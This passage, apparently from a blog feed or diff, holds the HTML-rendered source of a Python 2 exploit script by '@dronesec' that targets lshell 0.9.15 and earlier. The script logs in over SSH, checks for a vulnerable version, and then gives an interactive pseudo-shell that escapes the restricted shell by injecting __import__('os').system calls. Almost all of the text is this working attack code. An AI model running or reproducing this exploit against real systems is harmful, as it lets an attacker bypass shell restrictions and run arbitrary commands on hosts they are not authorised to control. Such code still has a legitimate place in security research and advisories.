+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import paramiko
+</span><span class='line'>import traceback
+</span><span class='line'>from time import sleep
+</span><span class='line'>
+</span><span class='line'>#
+</span><span class='line'># Exploit lshell pathing vulnerability in &lt;= 0.9.15.
+</span><span class='line'># Runs commands on the remote system.
+</span><span class='line'># @dronesec
+</span><span class='line'>#
+</span><span class='line'>
+</span><span class='line'>if len(sys.argv) &lt; 4:
+</span><span class='line'>    print '%s: [USER] [PW] [IP] {opt: port}'%(sys.argv[0])
+</span><span class='line'>    sys.exit(1)
+</span><span class='line'>
+</span><span class='line'>try:
+</span><span class='line'>    print '[!] .............................'
+</span><span class='line'>    print '[!] lshell &lt;= 0.9.15 remote shell.'
+</span><span class='line'>    print '[!] note: you can also ssh in and execute \'/bin/bash\''
+</span><span class='line'>    print '[!] .............................'
+</span><span class='line'>    print '[!] Checking host %s...'%(sys.argv[3])
+</span><span class='line'>    ssh = paramiko.SSHClient()
+</span><span class='line'>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+</span><span class='line'>    if len(sys.argv) == 5:
+</span><span class='line'>        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
+</span><span class='line'>    else:
+</span><span class='line'>        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>    # verify lshell 
+</span><span class='line'>    channel = ssh.invoke_shell()
+</span><span class='line'>    while not channel.recv_ready(): sleep(1)
+</span><span class='line'>    ret = channel.recv(2048)
+</span><span class='line'>
+</span><span class='line'>    channel.send('help help\n')
+</span><span class='line'>    while not channel.recv_ready(): sleep(1)
+</span><span class='line'>    ret = channel.recv(2048)
+</span><span class='line'>
+</span><span class='line'>    if not 'lshell' in ret:
+</span><span class='line'>        if 'forbidden' in ret:
+</span><span class='line'>            print '[-] Looks like we can\'t execute SSH commands'
+</span><span class='line'>        else:
+</span><span class='line'>            print '[-] Environment is not lshell'
+</span><span class='line'>        sys.exit(1)
+</span><span class='line'>
+</span><span class='line'>    # verify vulnerable version
+</span><span class='line'>    channel.send('sudo\n')
+</span><span class='line'>    while not channel.recv_ready(): sleep(1)
+</span><span class='line'>    ret = channel.recv(2048)
+</span><span class='line'>    if not 'Traceback' in ret:
+</span><span class='line'>        print '[-] lshell version not vulnerable.'
+</span><span class='line'>        sys.exit(1)
+</span><span class='line'>    channel.close()
+</span><span class='line'>    ssh.close()
+</span><span class='line'>
+</span><span class='line'>    # exec shell
+</span><span class='line'>    print '[+] vulnerable lshell found, preparing pseudo-shell...'
+</span><span class='line'>    if len(sys.argv) == 5:
+</span><span class='line'>        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
+</span><span class='line'>    else:
+</span><span class='line'>        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
+</span><span class='line'>
+</span><span class='line'>    while True:
+</span><span class='line'>        cmd = raw_input('$ ')
+</span><span class='line'>
+</span><span class='line'>        # breaks paramiko
+</span><span class='line'>        if cmd[0] is '/':
+</span><span class='line'>            print '[!] Running binaries won\'t work!'
+</span><span class='line'>            continue
+</span><span class='line'>
+</span><span class='line'>        cmd = cmd.replace("'", r"\'")
+</span><span class='line'>        cmd = 'echo __import__(\'os\').system(\'%s\')'%(cmd.replace(' ',r'\t'))
+</span><span class='line'>        if len(cmd) &gt; 1:
+</span><span class='line'>            if 'quit' in cmd or 'exit' in cmd:
+</span><span class='line'>                break
+</span><span class='line'>            (stdin,stdout,stderr) = ssh.exec_command(cmd)
+</span><span class='line'>        out = stdout.read()
+</span><span class='line'>        print out.strip()
+</span><span class='line'>except paramiko.AuthenticationException:
+</span><span class='line'>    print '[-] Authentication to %s failed.'%sys.argv[3]
+</span><span class='line'>except Exception, e:
+</span><span class='line'>    print '[-] Error: ', e
+</span><span class='line'>    print type(e)
+</span><span class='line'>    traceback.print_exc(file=sys.stdout)
+</span><span class='line'>finally:
+</span><span class='line'>    channel.close()
+</span><span class='line'>    ssh.close()</span></code></pre></td></tr></table></div></figure>
+
 ]]></content>
   </entry>
   
